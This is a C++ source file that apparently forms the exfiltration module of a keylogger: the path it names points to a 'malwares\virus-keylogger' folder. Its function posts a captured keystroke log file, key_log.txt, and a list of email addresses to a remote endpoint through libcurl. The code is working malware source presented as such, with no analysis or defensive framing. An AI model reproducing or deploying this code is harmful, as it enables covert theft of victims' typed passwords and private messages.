#include <curl/curl.h>
#include <iostream>
#include <stdexcept>
#include <vector>
#include <string>

bool send_email(const std::string& api_endpoint_url, std::vector<std::wstring> email_addr) {
    CURL* curl;
    CURLcode res = CURLE_OK;
    struct curl_httppost* formpost = NULL;
    struct curl_httppost* lastptr = NULL;
    struct curl_slist* headerlist = NULL;
    static const char buffer[] = "Expect:";
        
    curl_global_init(CURL_GLOBAL_ALL);
    curl_formadd(
        &formpost,
        &lastptr,
        CURLFORM_COPYNAME, "file",
        CURLFORM_FILE, "G:\\Programs\\C++\\malwares\\virus-keylogger\\key_log.txt", 
        CURLFORM_END
    );

    int counter = 0;

    for (const auto& email : email_addr) {
    std::string email_str(email.begin(), email.end());
        curl_formadd(
            &formpost,
            &lastptr,
            CURLFORM_COPYNAME, ("email" + std::to_string(counter)).c_str(),
            CURLFORM_COPYCONTENTS, email_str.c_str(),
            CURLFORM_END
        );
        ++counter;
    }

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, api_endpoint_url.c_str());
        headerlist = curl_slist_append(headerlist, buffer);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

        try {
            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                std::string error_message = "CURL Error: ";
                error_message += curl_easy_strerror(res);
                throw std::runtime_error(error_message);
            }
        }
        catch (const std::runtime_error& e) {
            std::cerr << e.what() << std::endl;
        }
        curl_easy_cleanup(curl);
    }

    curl_formfree(formpost);
    curl_slist_free_all(headerlist);
    curl_global_cleanup();

    return res == CURLE_OK;
}
